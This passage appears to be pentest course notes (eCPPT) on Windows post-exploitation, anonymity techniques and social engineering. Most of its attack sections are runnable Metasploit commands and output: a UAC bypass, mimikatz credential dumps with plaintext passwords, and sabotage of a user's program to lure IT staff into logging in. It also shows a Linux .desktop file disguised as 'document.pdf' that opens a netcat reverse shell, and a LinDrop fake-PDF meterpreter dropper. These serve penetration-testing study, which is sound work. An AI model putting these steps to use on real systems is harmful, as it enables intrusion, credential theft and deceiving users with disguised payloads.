<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>generate -f exe -o &lt;payload.exe&gt;
</code></pre></div></div>

<h4 id="set-the-listener">set the listener</h4>
<p>…</p>

<p>In a domain environment, a default Windows 7 machine:
    does not accept a psexec command from a non-domain administrator
    has UAC enabled
    prevents a local administrator from accessing a users profile without a UAC prompt</p>

<h4 id="upload-the-payload">upload the payload</h4>

<p>in meterpreter:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd ../
upload &lt;payload.exe&gt;
</code></pre></div></div>

<p>shell:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls &lt;payload.exe&gt; /grant Everyone&gt;(F) = to grant everyone full control to the payload we just uploaded
</code></pre></div></div>

<p>meterpreter:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>background
use post/windows/manage/run_as or exploit(windows/local/run_as)
set CMD C:\\Users\\SecondUser\\msfadexploit.exe
set USER LADM
set PASSWORD Pm2fUXScqI
set SESSION 1
set DOMAIN PCCLIENT7
run
</code></pre></div></div>

<blockquote>
  <p>now we get a shell with the LADM user
we cant use getsystem yet, we have to bypass UAC first</p>
</blockquote>

<h4 id="bypass-uac-1">bypass UAC</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/windows/local/bypassuac_injection
set options
run
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ps -U EXAMPLEAD.*
kill (moderApp.exe PID)
cd &lt;path to moderapp&gt;
del modernapp.exe
</code></pre></div></div>
<blockquote>
  <p>this way the user cannot open the app again</p>
</blockquote>

<blockquote>
  <p>after some time we can see with ps command, that a lot of cmd.exe and ping.exe are open
this means that the user called the IT and its trying to fix the issue of the program that died <strong>by itself</strong>
so now we load mimikatz to grab the IT credentials</p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>load mimikatz / kiwi
creds_kerberos
creds_wdigest
</code></pre></div></div>

<p>meterpreter &gt; creds_kerberos</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Running as SYSTEM
[*] Retrieving kerberos credentials
kerberos credentials
====================

Username    Domain         Password
--------    ------         --------
(null)      (null)         (null)
ExampleAdm  EXAMPLEAD.LAN  (null)
LADM        PCCLIENT7      (null)
SecondUser  EXAMPLEAD.LAN  (null)
exampleadm  EXAMPLEAD.LAN  (null)
pcclient7$  EXAMPLEAD.LAN  (null)

</code></pre></div></div>

<p>meterpreter &gt; creds_wdigest</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Running as SYSTEM
[*] Retrieving wdigest credentials
wdigest credentials
===================

Username    Domain     Password
--------    ------     --------
(null)      (null)     (null)
LADM        PCCLIENT7  Pm2fUXScqI
PCCLIENT7$  EXAMPLEAD  ea e9 9c 5a 62 25 eb 89 0f 7a 5d e3 3a a3 03 d5 84 76 29 2e 3e ca dd 58 0d f3 c9 3d a6 95 a
                       3 2b 45 01 54 36 18 2b 72 08 0c 2c 23 f2 e6 2c d3 74 ed cc e3 9a a1 76 82 68 f4 60 a5 c6 6e
                        4d 01 9d a3 66 c5 4e f9 99 cb 94 3a d7 13 f4 c4 a3 67 0b a5 54 40 27 39 7d ef 95 2d 90 1b
                       31 e3 7d 0a 98 9e 3f 8d 3d 17 e9 50 d4 05 a4 02 a4 83 f5 f8 42 88 83 48 c0 f5 dd e7 4c 22 9
                       f 05 3a a8 0d d4 8f a7 f3 5a fb b1 80 56 3a 01 33 7e 65 2c f8 9d ce 56 77 fd cb 5b 35 2c 2a
                        7e bb 40 89 83 25 f4 3a 28 7a 32 1f f0 89 32 0d ca 38 95 60 d2 a7 ca 2f d6 45 9f 01 56 2d
                       a2 50 a9 5c 36 f6 08 d3 43 d8 73 7d 39 60 86 36 f3 7c 82 31 5d e5 72 6b 57 ab 4b d7 49 1d 3
                       d ad 20 b0 75 9d 05 4e 83 5d 7b e1 a5 bf 4a e8 8e 6d e7 a7 b2 e8 28 39 90 a5 62 88
SecondUser  EXAMPLEAD  consciousAlert...
exampleadm  EXAMPLEAD  manageth3PCz
</code></pre></div></div>

<h4 id="grab-the-credentials">grab the credentials</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LADM        PCCLIENT7  Pm2fUXScqI
SecondUser  EXAMPLEAD  consciousAlert...
exampleadm  EXAMPLEAD  "manageth3PC'z"
</code></pre></div></div>

<h4 id="rdp-connection">RDP connection</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rdesktop -u examplead\\exampleadm -p "manageth3PC'z" 127.0.0.1
</code></pre></div></div>

<h1 id="anonymity">Anonymity</h1>

<ul>
  <li>Transparent Testing:</li>
</ul>

<p>if you are performing a security posture review, then there is no need for anonymity as the client knows you are coming and what purpose is for being there,
To successfully undertake this, ensure you supply your testing IPs to the customer, so you do not become inadvertently blocked during testing.</p>

<ul>
  <li>Dark Testing:</li>
</ul>

<p>If the customer wants to not only test their security posture, but also their security staff and security products knowledge, processes, procedures, discovery, reporting and response tactics, then a dark test is the way to go.</p>

<h2 id="browsing-anonymously">Browsing Anonymously</h2>

<p>Keep in mind that, anytime you send traffic through another person/companies computers to hide yourself, you are exposing all data you see to that person/company as they can sniff the data.</p>

<h3 id="http-proxies">HTTP Proxies</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The proxy server works on your behalf to request the web page, and subsequently sends it back to you.
This causes the web server to see the proxy servers address, not yours.
</code></pre></div></div>

<p>There are two general types of proxies:
	- Ones that require you to change your web browser settings in order to send requests through them
	// HTTP, SSL/HTTPS, FTP, Gopher or SOCKS
	- Others that are used through their web pages</p>

<h3 id="verify-your-public-ip-address">Verify your public IP address</h3>
<p>http://www.checkip.org/
http://www.whatsmyip.org/</p>

<h3 id="using-a-proxy-web-site">Using a proxy web site</h3>
<p>https://hide.me/en/proxy
https://hidemy.name/en/proxy-list/</p>

<h3 id="proxies-sub-types">Proxies Sub-types</h3>

<ul>
  <li>
    <p>High anonymous (elite proxies):
  These proxies do not change request fields and look like they come from a real IP.
  The users real IP is hidden and there is no indication to the web server that the request is coming from a proxy.</p>
  </li>
  <li>
    <p>Anonymous proxies:
  These proxies server also do not show your real IP address, but they do change the request fields. As a result, by analyzing the web log, its possible to detect that a proxy server was used.
  Not that this matters however, some server administrators do restrict proxy requests, so they use this type of information to block requests, such as this, in the future.</p>
  </li>
  <li>
    <p>Transparent proxies:
  Aka HTTP relay proxies, these systems change the request fields thus, they transfer the real IP address of the user.
  In other words, these proxy systems offer no security and should therefore never be used For security testing. The only reason to use these systems, if For network speed improvements.</p>
  </li>
</ul>

<h3 id="how-to-check-for-real-anonymous-proxies">How to check For Real anonymous Proxies</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Check the anonymity policy of the site you have chosen to use
Visit a site you own and verify the visitor logs
</code></pre></div></div>

<p>some anonymity testing:
	https://centralops.net/co/
	https://pentest-tools.com/home
	http://do-know.com/privacy-test.html
	http://www.all-nettools.com/</p>

<h3 id="http_via----http_x_forwarded_for">HTTP_VIA  /  HTTP_X_FORWARDED_FOR</h3>
<p>A standart HTTP request:
iF HTTP_VIA contains an address (or in case of chained proxies, many addresses), it actually indicates that there is a proxy server being used. The IP address included in this field is actually the IP address of the proxy server.
In contrast, the HTTP_X_FORWARDED_FOR field, if present, indicates the actual IP address of the client that the proxy is acting on behalf of For the communications.</p>

<p>// In case of high anonymity proxy systems 
// the http_via and http_x_forwarded_for would be: not determined
// its the same request as the original without proxy, but in this case the REMOTE_ADDR (IP) is from a proxy, but the administrators would have no indication that a proxy system is being used.</p>

<h3 id="tor-network">TOR Network</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.torproject.org/
https://www.torproject.org/about/overview.html.en

It protects you by bouncing your communications around a distributed network of relays run by volunteers all around the world.
This set of volunteer relays is called the Tor Network,
</code></pre></div></div>

<ul>
  <li>Client operating with Tor:
  Client requests a list of Tor nodes from a directory server
  The client randomly selects nodes on the Tor Network (called relays) and encrypts the traffic between each relay.
  If the client request a second destination after the specified time limit, another separate tunnel is created For that communication repeating the process.</li>
</ul>

<blockquote>
  <p>Tor only works For TCP streams and can be used by any application with SOCKS support.
Its highly recommended that you use protocol-specific support software, if you do not want the sites you visit to see your identifying information</p>
</blockquote>

<h2 id="tunneling-for-anonymity">Tunneling for Anonymity</h2>

<ul>
  <li>
    <p>SSH
  ssh encryption offers more secure privacy and security protection than an anonymous proxy server alone.
  ssh encrypts all communications to and from the client and server. This is achieved by activating a forwarder and a listener to both send a receive the traffic.</p>
  </li>
  <li>
    <p>IPSEC VPNs</p>
  </li>
</ul>

<h3 id="port-forwarding">Port Forwarding</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://help.ubuntu.com/community/SSH/OpenSSH/PortForwarding
types: local, remote, dynamic
</code></pre></div></div>

<ul>
  <li>example 1
we wanna access a machine via telnet, but the network is blocking telnet traffic
we can tunnel our telnet traffic through SSH
// local port:3000 &gt; ssh tunnel &gt; ssh server &gt; unencrypted &gt; homepc:23</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh -L 3000:homepc:23 root@mybox
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh -L &lt;local port to listen on&gt;:&lt;remote machine&gt;:&lt;remote port&gt; &lt;username@sshserver/target&gt;
</code></pre></div></div>

<p>we can now access the remote machine with: ‘’’’ telnet 127.0.0.1:3000 ‘’’’
the traffic will automatically go through the SSH tunnel, and it will be also encrypted.</p>

<ul>
  <li>example 2
we have two machines in the same network:
// our machine: 192.168.231.134
// ssh server machine: 192.168.231.135
// there is a mysql server, but it accepts only local connection (127.0.0.1)
// since we can not establish a connection with the mysql server from our client machine, we can use a ssh tunnel to forward the connection from our machine.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh -L 3000:localhost:3306 user@192.168.231.135
</code></pre></div></div>

<blockquote>
  <p>the command creates a tunnel from our local port 3000, to the localhost address on the SSH server, on port 3306 (default MySQL port)
we can now access mysql:</p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql -h 127.0.0.1 -P 3000 -u root 
</code></pre></div></div>

<h1 id="social-engineering">Social Engineering</h1>

<ul>
  <li>Forms of social interactions:
  The desire to be helpful
  The tendency to trust people
  The fear of getting in trouble
  Conflict avoidance</li>
</ul>

<h2 id="types-of-social-engineering">Types of Social Engineering</h2>

<h3 id="pretexting">Pretexting:</h3>
<p>The art of placing a person in a realistic but fake situation, in order to get them to divulge information such as social security, bank account, user id and passwords.
// example: Impersonate a help desk employee ans assisting another target employee with either a data move or a software update
// the fake help desk can trick the employee to download an update For their machine, thereby running malware on their system.</p>

<h3 id="phishing">Phishing</h3>
<p>Is an attack that utilizes a fraudulent email, in order to coerce people into executing malicious code or revealing pertinent information.</p>

<p>types:</p>
<ul>
  <li>Whaling:
// Targets Executives in an organization, such as the CFO For gaining specific types of information</li>
  <li>Spear Phishing:
// Targets specific individuals within an organization, to try and circumvent detection</li>
</ul>

<h3 id="baiting">Baiting</h3>
<p>Takes advantage of one of the most basic traits of humanity which is Curiosity.
The attacker will leave a media such as a CD, DVD or USB stick in a conspicuous location, relying on the curiosity factor of a passerby to pick up the media and attempt to take a look at its contents.
The attacker will place malware such as keystroke loggers, backdoors, etc. on the media, in order to either gain access or gather information from any system that tries to read the media.</p>

<h3 id="physical">Physical</h3>
<p>The social engineering will try to gain access to a facility or a restricted area. This is often accomplished by either piggybacking or shadowing a person into an entrance.
may wear a face badge in order to enter the building etc
Most organization lack proper training For their staff when it comes to simple observation as to the validity of an ID badge.</p>

<h2 id="samples-of-social-engineering-attacks">Samples of Social Engineering Attacks</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://www.virustotal.com/
</code></pre></div></div>

<h3 id="sample-1-canadian-lottery">Sample 1: Canadian Lottery</h3>
<p>it appears we have on money, but we need to open the attachment to see the details.
there is no viruses but they ask us to send information
and the account is not from canadian lottery domain</p>

<h3 id="sample-2-fbi-e-mail">Sample 2: FBI E-Mail</h3>
<p>verify the headers of the email
verify the domains of the senders</p>

<h3 id="sample-3-online-banking">Sample 3: Online Banking</h3>
<p>it makes the link look like official but redirecting the victim to a page that is owned by them (attackers)
the page would look real, but ultimately the person is just giving up their banking information</p>

<h3 id="pretexting-samples">Pretexting Samples</h3>
<p>pretexting is putting someone in a familiar situation to get them to divulge information
outage notification = interrupção de energia
so, we can take the advantage of the situation and call the person from that neighborhood and get information
every states has a set of prefixes, that is used For Social Security Numbers.
https://www.einvestigator.com/social-security-numbers-ssn/</p>

<p>keep in mind that is illegal: (since Gramm-Leach-Bliley act of 1999)</p>

<blockquote>
  <p>use false, fictitious or fraudulent statements or documents to get customer information from a financial institution.
use forged, conterfeit, lost, or stolen documents to get customer information from a financial institution or directly from a customer of a financial institution.
ask another person to get someone elses customer information using false, fictitious or fraudulent statements or using false, fictitious or fraudulent.</p>
</blockquote>

<h2 id="tools-3">Tools</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SET - The Social-Engineer Toolkit = https://github.com/trustedsec/social-engineer-toolkit
</code></pre></div></div>

<p>SET its a open-source penetration testing framework designed For social engineering.
manual: https://github.com/trustedsec/social-engineer-toolkit/tree/master/readme</p>

<p>setoolkit</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1 = to select - Spear-Phishing Attack Vectors
1 - perform a Mass Email Attack
there is many exploits and custom executables
select the payload, the target email address, the template and the SMPT configuration to send the phishing email
</code></pre></div></div>

<h2 id="social-engineering-linux-targets">Social Engineering Linux Targets</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>test.desktop
[Desktop Entry]
Type=Application
Name=document.pdf
Exec=/bin/nc -e /bin/sh &lt;kali ip&gt; &lt;port&gt;
Icon=&lt;path to icon&gt;

</code></pre></div></div>

<blockquote>
  <p>we can search For icons with: locate *pdf.svg</p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chmod +x test.desktop
</code></pre></div></div>

<blockquote>
  <p>we can send the document to the target machine and execute it to gain reverse shell</p>
</blockquote>

<h3 id="lindrop">Lindrop</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/secmode/LinDrop/blob/master/LinDrop.py
https://www.obscurechannel.com/x42/lindrop.html
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python LinDrop.py

output name: &lt;the file that will be displayed to the user&gt;
output zip: &lt;same name&gt;
// create a msfvenom payload
// msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;kali ip&gt; LPORT=&lt;port&gt; -f elf &gt; payload
// open a web server with python
remote payload URL: &lt;http://&lt;kali ip&gt;/payload&gt;
//prepare a multi handler listener
remote pdf to display: &lt;http://kali ip/pdf of your choice&gt;
</code></pre></div></div>

<blockquote>
  <p>when the pdf is opened, we will gain a reverse shell from meterpreter</p>
</blockquote>


        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#begginer" class="page__taxonomy-item" rel="tag">begginer</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#internal" class="page__taxonomy-item" rel="tag">internal</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#osint" class="page__taxonomy-item" rel="tag">osint</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#pentest" class="page__taxonomy-item" rel="tag">pentest</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#recon" class="page__taxonomy-item" rel="tag">recon</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#ecppt" class="page__taxonomy-item" rel="tag">ecppt</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#notes" class="page__taxonomy-item" rel="tag">notes</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-11-20T00:00:00+06:00">November 20, 2023</time></p>
        
      </footer>

      <section class="page__share">
  
    <h4 class="page__share-title">Share on</h4>
  

  <a href="https://twitter.com/intent/tweet?text=2+-+Network+Security%20http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fecppt%2Fnetworksecurity%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>

  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fecppt%2Fnetworksecurity%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>

  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fecppt%2Fnetworksecurity%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
</section>


      
  <nav class="pagination">
    
      <a href="/notes/ecppt/systemsecurity/" class="pagination--pager" title="1 - System Security
">Previous</a>
    
    
      <a href="/notes/ecppt/powershell/" class="pagination--pager" title="3 - Powershell
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">

    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>





  
    <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
  
    <script src="/assets/js/clipboard.js"></script>
  



  </body>
</html>
